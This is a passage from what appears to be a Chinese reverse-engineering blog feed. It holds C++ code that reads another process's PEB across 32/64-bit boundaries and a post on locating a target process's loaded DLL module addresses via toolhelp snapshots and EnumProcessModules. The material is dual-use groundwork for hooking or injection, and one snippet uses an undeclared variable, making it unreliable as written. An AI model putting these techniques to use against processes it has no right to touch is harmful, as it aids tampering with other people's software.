pImageHeaderHash;</span><br><span class="line">    T TracingFlags;</span><br><span class="line">    T CsrServerReadOnlySharedMemoryBase;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> _PEB_T&lt;DWORD, DWORD64, <span class="number">34</span>&gt; _PEB32;</span><br><span class="line"><span class="keyword">typedef</span> _PEB_T&lt;DWORD64, DWORD, <span class="number">30</span>&gt; _PEB64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_STRING_32</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT32 Buffer;</span><br><span class="line">&#125; STRING32, *PSTRING32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_STRING_64</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT64 Buffer;</span><br><span class="line">&#125; STRING64, *PSTRING64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_DRIVE_LETTER_CURDIR_32</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Flags;</span><br><span class="line">    WORD Length;</span><br><span class="line">    ULONG TimeStamp;</span><br><span class="line">    STRING32 DosPath;</span><br><span class="line">&#125; RTL_DRIVE_LETTER_CURDIR32, *PRTL_DRIVE_LETTER_CURDIR32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_DRIVE_LETTER_CURDIR_64</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Flags;</span><br><span class="line">    WORD Length;</span><br><span class="line">    ULONG TimeStamp;</span><br><span class="line">    STRING64 DosPath;</span><br><span class="line">&#125; RTL_DRIVE_LETTER_CURDIR64, *PRTL_DRIVE_LETTER_CURDIR64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING_32</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT32 Buffer;</span><br><span class="line">&#125; UNICODE_STRING32, *PUNICODE_STRING32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING_64</span></span><br><span class="line">&#123;</span><br><span class="line">    WORD Length;</span><br><span class="line">    WORD MaximumLength;</span><br><span class="line">    UINT64 Buffer;</span><br><span class="line">&#125; UNICODE_STRING64, *PUNICODE_STRING64;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CURDIR_32</span></span><br><span class="line">&#123;</span><br><span class="line">    UNICODE_STRING32 DosPath;</span><br><span class="line">    UINT32 Handle;</span><br><span class="line">&#125; CURDIR32, *PCURDIR32;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_USER_PROCESS_PARAMETERS_32</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG MaximumLength;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    ULONG DebugFlags;</span><br><span class="line">    UINT32 ConsoleHandle;</span><br><span class="line">    ULONG ConsoleFlags;</span><br><span class="line">    UINT32 StandardInput;</span><br><span class="line">    UINT32 StandardOutput;</span><br><span class="line">    UINT32 StandardError;</span><br><span class="line">    CURDIR32 CurrentDirectory;</span><br><span class="line">    UNICODE_STRING32 DllPath;</span><br><span class="line">    UNICODE_STRING32 ImagePathName;</span><br><span class="line">    UNICODE_STRING32 CommandLine;</span><br><span class="line">    UINT32 Environment;</span><br><span class="line">    ULONG StartingX;</span><br><span class="line">    ULONG StartingY;</span><br><span class="line">    ULONG CountX;</span><br><span class="line">    ULONG CountY;</span><br><span class="line">    ULONG CountCharsX;</span><br><span class="line">    ULONG CountCharsY;</span><br><span class="line">    ULONG FillAttribute;</span><br><span class="line">    ULONG WindowFlags;</span><br><span class="line">    ULONG ShowWindowFlags;</span><br><span class="line">    UNICODE_STRING32 WindowTitle;</span><br><span class="line">    UNICODE_STRING32 DesktopInfo;</span><br><span class="line">    UNICODE_STRING32 ShellInfo;</span><br><span class="line">    UNICODE_STRING32 RuntimeData;</span><br><span class="line">    RTL_DRIVE_LETTER_CURDIR32 CurrentDirectores[<span class="number">32</span>];</span><br><span class="line">    ULONG EnvironmentSize;</span><br><span class="line">&#125; RTL_USER_PROCESS_PARAMETERS32, *PRTL_USER_PROCESS_PARAMETERS32;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CURDIR_64</span></span><br><span class="line">&#123;</span><br><span class="line">    UNICODE_STRING64 DosPath;</span><br><span class="line">    UINT64 Handle;</span><br><span class="line">&#125; CURDIR64, *PCURDIR64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_RTL_USER_PROCESS_PARAMETERS_64</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG MaximumLength;</span><br><span class="line">    ULONG Length;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    ULONG DebugFlags;</span><br><span class="line">    UINT64 ConsoleHandle;</span><br><span class="line">    ULONG ConsoleFlags;</span><br><span class="line">    UINT64 StandardInput;</span><br><span class="line">    UINT64 StandardOutput;</span><br><span class="line">    UINT64 StandardError;</span><br><span class="line">    CURDIR64 CurrentDirectory;</span><br><span class="line">    UNICODE_STRING64 DllPath;</span><br><span class="line">    UNICODE_STRING64 ImagePathName;</span><br><span class="line">    UNICODE_STRING64 CommandLine;</span><br><span class="line">    UINT64 Environment;</span><br><span class="line">    ULONG StartingX;</span><br><span class="line">    ULONG StartingY;</span><br><span class="line">    ULONG CountX;</span><br><span class="line">    ULONG CountY;</span><br><span class="line">    ULONG CountCharsX;</span><br><span class="line">    ULONG CountCharsY;</span><br><span class="line">    ULONG FillAttribute;</span><br><span class="line">    ULONG WindowFlags;</span><br><span class="line">    ULONG ShowWindowFlags;</span><br><span class="line">    UNICODE_STRING64 WindowTitle;</span><br><span class="line">    UNICODE_STRING64 DesktopInfo;</span><br><span class="line">    UNICODE_STRING64 ShellInfo;</span><br><span class="line">    UNICODE_STRING64 RuntimeData;</span><br><span class="line">    RTL_DRIVE_LETTER_CURDIR64 CurrentDirectores[<span class="number">32</span>];</span><br><span class="line">    ULONG EnvironmentSize;</span><br><span class="line">&#125; RTL_USER_PROCESS_PARAMETERS64, *PRTL_USER_PROCESS_PARAMETERS64;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_BASIC_INFORMATION64</span> &#123;</span><br><span class="line">    NTSTATUS ExitStatus;</span><br><span class="line">    UINT32 Reserved0;</span><br><span class="line">    UINT64 PebBaseAddress;</span><br><span class="line">    UINT64 AffinityMask;</span><br><span class="line">    UINT32 BasePriority;</span><br><span class="line">    UINT32 Reserved1;</span><br><span class="line">    UINT64 UniqueProcessId;</span><br><span class="line">    UINT64 InheritedFromUniqueProcessId;</span><br><span class="line">&#125; PROCESS_BASIC_INFORMATION64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PROCESS_BASIC_INFORMATION32</span> &#123;</span><br><span class="line">    NTSTATUS ExitStatus;</span><br><span class="line">    UINT32 PebBaseAddress;</span><br><span class="line">    UINT32 AffinityMask;</span><br><span class="line">    UINT32 BasePriority;</span><br><span class="line">    UINT32 UniqueProcessId;</span><br><span class="line">    UINT32 InheritedFromUniqueProcessId;</span><br><span class="line">&#125; PROCESS_BASIC_INFORMATION32;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> endregion</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">HANDLE m_ProcessHandle = </span><br><span class="line"><span class="built_in">OpenProcess</span>(</span><br><span class="line">PROCESS_ALL_ACCESS,<span class="comment">// 所有权限</span></span><br><span class="line">FALSE,<span class="comment">// 不继承句柄</span></span><br><span class="line"><span class="number">8016</span><span class="comment">// 进程ID，此处为了方便直接写死</span></span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line">    BOOL bSource = FALSE;<span class="comment">// 判断自身进程是否为 64位</span></span><br><span class="line">    BOOL bTarget = FALSE;<span class="comment">// 判断目标进程是否为 64位</span></span><br><span class="line">    <span class="built_in">IsWow64Process</span>(</span><br><span class="line"><span class="built_in">GetCurrentProcess</span>(),<span class="comment">// 进程句柄</span></span><br><span class="line">&amp;bSource<span class="comment">// 用来接收返回值的变量，64位 FLASE | 32位 TRUE</span></span><br><span class="line">);</span><br><span class="line">    <span class="built_in">IsWow64Process</span>(</span><br><span class="line">m_ProcessHandle,<span class="comment">// 进程句柄</span></span><br><span class="line">&amp;bTarget<span class="comment">// 用来接收返回值的变量，64位 FLASE | 32位 TRUE</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标 64位，自身 32位</span></span><br><span class="line">    <span class="keyword">if</span>(bTarget == FALSE &amp;&amp; bSource == TRUE)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">// 获取 ntdll.dll 模块句柄</span></span><br><span class="line">        HMODULE NtdllModule = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">pfnNtWow64QueryInformationProcess64 NtWow64QueryInformationProcess64 = (pfnNtWow64QueryInformationProcess64)<span class="built_in">GetProcAddress</span>(NtdllModule,<span class="string">&quot;NtWow64QueryInformationProcess64&quot;</span>);</span><br><span class="line">pfnNtWow64ReadVirtualMemory64 NtWow64ReadVirtualMemory64 = (pfnNtWow64ReadVirtualMemory64)<span class="built_in">GetProcAddress</span>(NtdllModule,<span class="string">&quot;NtWow64ReadVirtualMemory64&quot;</span>);</span><br><span class="line">        PROCESS_BASIC_INFORMATION64 pbi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        UINT64 ReturnLength = <span class="number">0</span>;</span><br><span class="line">        NTSTATUS Status = <span class="built_in">NtWow64QueryInformationProcess64</span>(m_ProcessHandle,ProcessBasicInformation,&amp;pbi,(UINT32)<span class="built_in">sizeof</span>(pbi),(UINT32*)&amp;ReturnLength);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))&#123;</span><br><span class="line">            _PEB64* Peb = (_PEB64*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(_PEB64));</span><br><span class="line">            RTL_USER_PROCESS_PARAMETERS64* ProcessParameters = (RTL_USER_PROCESS_PARAMETERS64*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(RTL_USER_PROCESS_PARAMETERS64));</span><br><span class="line">            Status = <span class="built_in">NtWow64ReadVirtualMemory64</span>(m_ProcessHandle,(PVOID64)pbi.PebBaseAddress,(_PEB64*)Peb,<span class="built_in">sizeof</span>(_PEB64),&amp;ReturnLength);</span><br><span class="line"></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;PEB地址:&quot;</span> &lt;&lt; std::hex &lt;&lt; pbi.PebBaseAddress &lt;&lt; std::endl;</span><br><span class="line">            <span class="comment">//cout &lt;&lt; &quot;Ldr:&quot; &lt;&lt; hex &lt;&lt; Peb-&gt;Ldr &lt;&lt; endl;</span></span><br><span class="line">            <span class="comment">//cout &lt;&lt; &quot;ImageBaseAddress:&quot; &lt;&lt; hex &lt;&lt; Peb-&gt;ImageBaseAddress &lt;&lt; endl;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 目标 32位，自身 32位</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (bTarget == TRUE &amp;&amp; bSource == TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        HMODULE NtdllModule = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">        pfnNtQueryInformationProcess NtQueryInformationProcess = (pfnNtQueryInformationProcess)<span class="built_in">GetProcAddress</span>(NtdllModule,<span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line">        PROCESS_BASIC_INFORMATION32 pbi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        UINT32  ReturnLength = <span class="number">0</span>;</span><br><span class="line">        NTSTATUS Status = <span class="built_in">NtQueryInformationProcess</span>(m_ProcessHandle,ProcessBasicInformation,&amp;pbi,(UINT32)<span class="built_in">sizeof</span>(pbi),(UINT32*)&amp;ReturnLength);</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))&#123;</span><br><span class="line">            _PEB32* Peb = (_PEB32*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(_PEB32));</span><br><span class="line">            <span class="built_in">ReadProcessMemory</span>(m_ProcessHandle, (PVOID)pbi.PebBaseAddress,(_PEB32*)Peb,<span class="built_in">sizeof</span>(_PEB32),<span class="literal">NULL</span>);</span><br><span class="line">           </span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;PEB地址:&quot;</span> &lt;&lt; std::hex &lt;&lt; pbi.PebBaseAddress &lt;&lt; std::endl;</span><br><span class="line">            <span class="comment">//printf(&quot;LdrAddress:%x\r\n&quot;, ((_PEB32*)Peb)-&gt;Ldr);</span></span><br><span class="line">            <span class="comment">//printf(&quot;ImageBaseAddress:%x\r\n&quot;, ((_PEB32*)Peb)-&gt;ImageBaseAddress);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>四种获取目标进程导入DLL模块地址的方法</title>
      <link href="/2024/02/04/%E5%9B%9B%E7%A7%8D%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%85%A5DLL%E6%A8%A1%E5%9D%97%E5%9C%B0%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2024/02/04/%E5%9B%9B%E7%A7%8D%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%85%A5DLL%E6%A8%A1%E5%9D%97%E5%9C%B0%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="四种获取目标进程导入DLL模块地址的方法"><a href="#四种获取目标进程导入DLL模块地址的方法" class="headerlink" title="四种获取目标进程导入DLL模块地址的方法"></a>四种获取目标进程导入DLL模块地址的方法</h1><p>本人在校大学生一枚，技术不太行，各位师傅将就看看。</p><h1 id="1-获取进程快照"><a href="#1-获取进程快照" class="headerlink" title="1. 获取进程快照"></a>1. 获取进程快照</h1><p><code>tlhelp32.h</code>头文件中，提供了<code>CreateToolhelp32Snapshot</code>API，可以获取获取指定进程以及这些进程使用的堆、模块和线程的快照。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateToolhelp32Snapshot</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD dwFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD th32ProcessID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20231214001210494.png" alt="image-20231214001210494"></p><p>在进程快照信息中，包含着进程导入模块的信息。因此，我们可以有如下实现思路：</p><ol><li>调用<code>CreateToolhelp32Snapshot</code>指定<code>TH32CS_SNAPPROCESS</code>属性，获取进程快照句柄。</li><li>使用<code>Process32Next</code>遍历进程信息，对比进程名查找到目标进程。</li><li>使用<code>OpenProcess</code>验证目标进程状态。</li><li>调用<code>CreateToolhelp32Snapshot</code>指定<code>TH32CS_SNAPMODULE</code>属性，获取目标进程的模块快照。</li><li>使用<code>Module32Next</code>遍历模块，直到获取到目标模块信息，返回目标模块的句柄。</li><li>后续干什么都可以了，例如使用<code>GetProcAddress</code>获取目标函数的地址。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">HMODULE <span class="title">GetProcessModuleHandle</span><span class="params">(DWORD pid, CONST TCHAR* moduleName)</span> </span>&#123;<span class="comment">// 根据 PID 、模块名（需要写后缀，如：&quot;.dll&quot;），获取模块入口地址</span></span><br><span class="line">    MODULEENTRY32 moduleEntry;</span><br><span class="line">    HANDLE handle = <span class="literal">NULL</span>;</span><br><span class="line">    moudleInfoHandle = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPMODULE, pid); <span class="comment">//  获取进程快照的打开句柄，包含模块信息（TH32CS_SNAPMODULE指定）</span></span><br><span class="line">    <span class="keyword">if</span> (!moudleInfoHandle) &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(moudleInfoHandle);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;moduleEntry, <span class="built_in">sizeof</span>(MODULEENTRY32));</span><br><span class="line">    moduleEntry.dwSize = <span class="built_in">sizeof</span>(MODULEENTRY32);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">Module32First</span>(moudleInfoHandle, &amp;moduleEntry)) &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(moudleInfoHandle);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_tcscmp(moduleEntry.szModule, moduleName) == <span class="number">0</span>) &#123; </span><br><span class="line">            <span class="built_in">CloseHandle</span>(moudleInfoHandle);</span><br><span class="line">            <span class="keyword">return</span> moduleEntry.hModule; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="built_in">Module32Next</span>(moudleInfoHandle, &amp;moduleEntry));</span><br><span class="line">    <span class="built_in">CloseHandle</span>(moudleInfoHandle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE hProcessSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);  <span class="comment">// 进程快照句柄</span></span><br><span class="line">    PROCESSENTRY32 process = &#123; </span><br><span class="line">        <span class="built_in">sizeof</span>(PROCESSENTRY32) </span><br><span class="line">    &#125;;<span class="comment">// 存放进程快照的结构体</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//  遍历进程</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hProcessSnap, &amp;process)) &#123;</span><br><span class="line">        <span class="comment">// 找到目标进程</span></span><br><span class="line">        std::string s_szExeFile = process.szExeFile; <span class="comment">// char* 转 string</span></span><br><span class="line">        <span class="keyword">if</span> (s_szExeFile == <span class="string">&quot;xxx.exe&quot;</span>) &#123;</span><br><span class="line">            HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, process.th32ProcessID); </span><br><span class="line">            <span class="keyword">if</span> (hProcess)</span><br><span class="line">            &#123;</span><br><span class="line">                HMODULE hMod = <span class="built_in">GetProcessModuleHandle</span>(process.th32ProcessID, <span class="string">&quot;xxx.dll&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (hMod)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">auto</span> fnAddress = <span class="built_in">GetProcAddress</span>(hMod, <span class="string">&quot;xxFunc&quot;</span>);</span><br><span class="line">                    </span><br><span class="line">                    std::cout &lt;&lt; fnAddress &lt;&lt;<span class="string">&quot;        &quot;</span>&lt;&lt; <span class="built_in">GetLastError</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-枚举进程模块"><a href="#2-枚举进程模块" class="headerlink" title="2. 枚举进程模块"></a>2. 枚举进程模块</h1><p>按照微软官方的建议，使用<code>EnumProcessModules</code>函数枚举进程模块可以确定哪些进程加载了特定的DLL。这个函数在<code>psapi.h</code>中。以下是微软给出的实例代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">EnumProcessModules</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE  hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] HMODULE *lphModule,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD   cb,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] LPDWORD lpcbNeeded</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><ol><li>根据进程ID，调用<code>OpenProcess</code>获取进程句柄。</li><li>调用<code>EnumProcessModules</code>函数枚举模块信息。模块句柄都返回到hMods数组中。进一步筛选即可。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 为了确保正确解析符号，需要将 Psapi.lib 添加到 TARGETLIBS，并使用 -DPSAPI_VERSION=1 编译</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">PrintModules</span><span class="params">( DWORD processID )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hMods[<span class="number">1024</span>];</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    DWORD cbNeeded;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印进程标识符。</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>( <span class="string">&quot;\n进程 ID：%u\n&quot;</span>, processID );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取进程的句柄。</span></span><br><span class="line"></span><br><span class="line">    hProcess = <span class="built_in">OpenProcess</span>( PROCESS_QUERY_INFORMATION |</span><br><span class="line">                            PROCESS_VM_READ,</span><br><span class="line">                            FALSE, processID );</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 获取此进程中所有模块的列表。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">EnumProcessModules</span>(hProcess, hMods, <span class="built_in">sizeof</span>(hMods), &amp;cbNeeded))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (cbNeeded / <span class="built_in">sizeof</span>(HMODULE)); i++ )</span><br><span class="line">        &#123;</span><br><span class="line">            TCHAR szModName[MAX_PATH];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取模块文件的完整路径。</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">GetModuleFileNameEx</span>( hProcess, hMods[i], szModName,<span class="built_in">sizeof</span>(szModName) / <span class="built_in">sizeof</span>(TCHAR)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 打印模块名和句柄值。</span></span><br><span class="line"></span><br><span class="line">                _tprintf( <span class="built_in">TEXT</span>(<span class="string">&quot;\t%s (0x%08X)\n&quot;</span>), szModName, hMods[i] );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放对进程的句柄。</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>( hProcess );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">( <span class="type">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    DWORD aProcesses[<span class="number">1024</span>]; </span><br><span class="line">    DWORD cbNeeded; </span><br><span class="line">    DWORD cProcesses;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取进程标识符的列表。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">EnumProcesses</span>( aProcesses, <span class="built_in">sizeof</span>(aProcesses), &amp;cbNeeded ) )</span><br><span class="line">        <span 